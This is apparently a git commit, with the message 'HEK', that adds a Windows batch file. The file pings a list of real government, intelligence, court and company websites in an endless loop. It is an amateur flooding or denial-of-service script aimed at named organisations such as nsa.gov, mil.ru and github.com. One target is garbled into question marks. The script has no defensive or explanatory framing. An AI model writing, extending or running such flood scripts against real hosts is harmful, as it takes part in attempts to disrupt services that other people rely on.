dcd27b2e0faaadac3963bd10a6d69955b2751d0e
MOD347 <54637557+MOD347@users.noreply.github.com>
2019-09-03 23:05:38 -0500

    HEK

---
+++ X.bat
@@ -0,0 +1,25 @@
+@echo off
+:x
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.nsa.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.cia.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.fbi.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.dni.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.doj.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.dod.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.state.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.whitehouse.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.privacyshield.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.gov.uk
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.oecd.org
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.bundesregierung.de
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.english.gov.cn
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.india.gov.in
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.mil.ru
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 ???????????.??????????.??
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.fisc.uscourts.gov..
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 id.loc.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.rsa.gov
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.bcbstx.com
+ping -n 5 -w 0 -l 0 -S 127.0.0.1 www.github.com
+ping -n 5 -W 0 -l 0 -S 127.0.0.1 www.masterclass.com
+goto x
